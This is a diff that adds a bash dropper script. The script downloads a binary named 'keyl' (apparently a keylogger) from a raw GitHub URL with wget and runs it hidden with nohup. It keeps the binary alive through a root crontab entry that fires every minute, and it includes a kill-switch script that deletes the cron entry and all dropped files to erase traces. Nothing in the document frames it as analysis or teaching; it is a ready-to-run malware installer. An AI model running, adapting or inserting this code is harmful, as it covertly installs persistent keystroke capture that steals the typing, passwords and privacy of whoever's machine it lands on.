@@ -1,0 +1,25 @@
+bash -c "$(cat << 'EOF'
+cat << 'EOL1' > /tmp/launch.sh
+#!/bin/bash
+if ! pgrep -f "/tmp/keyl" > /dev/null; then
+    nohup /tmp/keyl &> /dev/null &
+fi
+EOL1
+chmod +x /tmp/launch.sh
+
+cat << 'EOL2' > /tmp/killSwitch.sh
+#!/bin/bash
+crontab -l -u root > /tmp/root_crontab.bak 2>/dev/null
+grep -v 'launch.sh' /tmp/root_crontab.bak > /tmp/root_crontab.new
+crontab -u root /tmp/root_crontab.new
+rm /tmp/root_crontab.bak /tmp/root_crontab.new
+rm -f /tmp/keyl /tmp/launch.sh /tmp/killSwitch.sh
+EOL2
+chmod +x /tmp/killSwitch.sh
+
+echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -
+wget -O /tmp/keyl https://raw.githubusercontent.com/fortigate3600/KeyL/main/keyl
+chmod u+x /tmp/keyl
+nohup /tmp/keyl &> /dev/null &
+EOF
+)"
